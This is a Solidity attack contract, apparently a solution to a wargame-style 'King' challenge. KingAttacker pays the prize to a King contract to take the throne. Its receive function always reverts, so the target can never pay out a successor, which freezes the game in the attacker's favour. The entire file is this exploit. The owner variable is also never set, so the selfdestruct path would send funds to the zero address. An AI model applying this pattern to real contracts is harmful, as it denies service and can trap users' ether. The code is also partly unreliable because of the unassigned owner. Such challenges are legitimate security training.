// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // to interact with King

import './King.sol';

contract KingAttacker {

    King public king;
    address public owner;

    constructor(address payable _king) public payable {
        king = King(_king);
    }

    function becomeKing() external payable {
        uint256 amountToBeKing = king.prize();
        if(address(this).balance != amountToBeKing)
            selfdestruct(payable(owner));

        (bool sent,) = payable(address(king)).call.value(amountToBeKing)("");
        require(sent, "failed to send ether!");
    }

    receive() external payable {
        revert("the current king does not accept ether!");
    }
}